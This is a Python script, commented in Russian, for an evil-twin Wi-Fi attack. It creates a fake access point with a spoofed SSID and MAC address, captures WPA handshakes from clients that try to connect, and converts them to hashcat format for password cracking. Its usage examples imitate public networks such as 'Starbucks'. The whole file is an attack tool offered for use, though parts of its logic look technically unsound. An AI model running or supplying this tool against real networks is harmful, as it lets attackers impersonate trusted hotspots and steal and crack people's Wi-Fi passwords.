#!/usr/bin/env python3
"""
Fake WiFi Access Point - перехватчик WPA handshake
Создает точку доступа с заданным SSID и MAC, перехватывает попытки подключения
"""

import os
import sys
import subprocess
import time
import signal
from datetime import datetime
from scapy.all import *

class FakeAP:
    def __init__(self, interface, ssid, mac_address, channel=6):
        self.interface = interface
        self.ssid = ssid
        self.mac_address = mac_address
        self.channel = channel
        self.capture_file = f"handshake_{ssid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.cap"
        self.log_file = f"log_{ssid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.running = False
        self.hostapd_process = None
        self.airodump_process = None

    def check_root(self):
        """Проверка прав root"""
        if os.geteuid() != 0:
            print("[!] Требуются права root/администратора")
            sys.exit(1)

    def check_dependencies(self):
        """Проверка наличия необходимых инструментов"""
        tools = ['hostapd', 'airmon-ng', 'airodump-ng']
        missing = []

        for tool in tools:
            if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                missing.append(tool)

        if missing:
            print(f"[!] Отсутствуют инструменты: {', '.join(missing)}")
            print("[!] Установите aircrack-ng suite и hostapd")
            sys.exit(1)

    def enable_monitor_mode(self):
        """Включение режима монитора"""
        print(f"[*] Включение режима монитора на {self.interface}")

        # Останавливаем конфликтующие процессы
        subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Включаем monitor mode
        result = subprocess.run(['airmon-ng', 'start', self.interface],
                              capture_output=True, text=True)

        # Определяем имя интерфейса в режиме монитора
        if 'mon' in result.stdout:
            # Обычно это wlan0mon или подобное
            self.monitor_interface = self.interface + 'mon'
            print(f"[+] Режим монитора включен: {self.monitor_interface}")
        else:
            print("[!] Не удалось включить режим монитора")
            sys.exit(1)

    def set_mac_address(self):
        """Установка MAC адреса"""
        print(f"[*] Установка MAC адреса: {self.mac_address}")

        # Выключаем интерфейс
        subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'],
                      stdout=subprocess.DEVNULL)

        # Меняем MAC
        subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'address', self.mac_address],
                      stdout=subprocess.DEVNULL)

        # Включаем интерфейс
        subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'],
                      stdout=subprocess.DEVNULL)

        print(f"[+] MAC адрес установлен: {self.mac_address}")

    def create_hostapd_config(self):
        """Создание конфигурации hostapd"""
        config_file = '/tmp/hostapd_fake.conf'

        config = f"""interface={self.monitor_interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=fakepassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""

        with open(config_file, 'w') as f:
            f.write(config)

        print(f"[+] Конфигурация hostapd создана: {config_file}")
        return config_file

    def start_hostapd(self, config_file):
        """Запуск hostapd"""
        print(f"[*] Запуск точки доступа '{self.ssid}'")

        self.hostapd_process = subprocess.Popen(
            ['hostapd', config_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        time.sleep(3)

        if self.hostapd_process.poll() is None:
            print(f"[+] Точка доступа '{self.ssid}' запущена")
            print(f"[+] MAC адрес: {self.mac_address}")
            print(f"[+] Канал: {self.channel}")
        else:
            print("[!] Ошибка запуска hostapd")
            sys.exit(1)

    def start_capture(self):
        """Запуск перехвата handshake"""
        print(f"[*] Запуск перехвата handshake -> {self.capture_file}")

        self.airodump_process = subprocess.Popen(
            ['airodump-ng', '-c', str(self.channel),
             '--bssid', self.mac_address,
             '-w', self.capture_file.replace('.cap', ''),
             '--output-format', 'pcap',
             self.monitor_interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        print("[+] Перехват запущен")
        print("[*] Ожидание подключений...")

    def log_event(self, message):
        """Логирование событий"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"[{timestamp}] {message}\n"

        print(log_message.strip())

        with open(self.log_file, 'a') as f:
            f.write(log_message)

    def monitor_handshakes(self):
        """Мониторинг перехваченных handshake"""
        print("[*] Мониторинг handshake...")

        while self.running:
            time.sleep(5)

            # Проверяем наличие .cap файла
            cap_file = self.capture_file.replace('.cap', '-01.cap')
            if os.path.exists(cap_file):
                # Проверяем наличие handshake
                result = subprocess.run(
                    ['aircrack-ng', cap_file],
                    capture_output=True,
                    text=True
                )

                if 'handshake' in result.stdout.lower():
                    self.log_event(f"[+] HANDSHAKE ПЕРЕХВАЧЕН! Сохранен в {cap_file}")

                    # Извлекаем хэш в формат hashcat
                    self.extract_hashcat_format(cap_file)

    def extract_hashcat_format(self, cap_file):
        """Извлечение хэша в формат hashcat"""
        hccapx_file = cap_file.replace('.cap', '.hccapx')

        # Конвертация в формат hashcat (требует cap2hccapx или hcxpcaptool)
        if subprocess.call(['which', 'hcxpcaptool'], stdout=subprocess.DEVNULL) == 0:
            subprocess.run(['hcxpcaptool', '-o', hccapx_file, cap_file],
                         stdout=subprocess.DEVNULL)
            self.log_event(f"[+] Хэш сохранен в формате hashcat: {hccapx_file}")

    def cleanup(self):
        """Очистка и остановка"""
        print("\n[*] Остановка...")
        self.running = False

        if self.hostapd_process:
            self.hostapd_process.terminate()
            self.hostapd_process.wait()

        if self.airodump_process:
            self.airodump_process.terminate()
            self.airodump_process.wait()

        # Останавливаем monitor mode
        subprocess.run(['airmon-ng', 'stop', self.monitor_interface],
                      stdout=subprocess.DEVNULL)

        print("[+] Очистка завершена")
        print(f"[+] Файлы сохранены:")
        print(f"    - Capture: {self.capture_file}")
        print(f"    - Log: {self.log_file}")

    def run(self):
        """Основной цикл работы"""
        self.check_root()
        self.check_dependencies()

        self.log_event(f"Запуск Fake AP: {self.ssid}")
        self.log_event(f"MAC адрес: {self.mac_address}")
        self.log_event(f"Канал: {self.channel}")

        self.enable_monitor_mode()
        self.set_mac_address()

        config_file = self.create_hostapd_config()
        self.start_hostapd(config_file)
        self.start_capture()

        self.running = True

        # Обработка Ctrl+C
        def signal_handler(sig, frame):
            self.cleanup()
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        # Мониторинг
        self.monitor_handshakes()


def main():
    print("""
╔══════════════════════════════════════════╗
║     Fake WiFi AP - Handshake Catcher     ║
║          WPA/WPA2 Handshake Tool         ║
╚══════════════════════════════════════════╝
    """)

    if len(sys.argv) < 4:
        print("Использование:")
        print(f"  {sys.argv[0]} <interface> <SSID> <MAC_address> [channel]")
        print("\nПример:")
        print(f"  {sys.argv[0]} wlan0 'Free WiFi' 00:11:22:33:44:55 6")
        print(f"  {sys.argv[0]} wlan1 'Starbucks' AA:BB:CC:DD:EE:FF 11")
        sys.exit(1)

    interface = sys.argv[1]
    ssid = sys.argv[2]
    mac_address = sys.argv[3]
    channel = int(sys.argv[4]) if len(sys.argv) > 4 else 6

    ap = FakeAP(interface, ssid, mac_address, channel)
    ap.run()


if __name__ == '__main__':
    main()
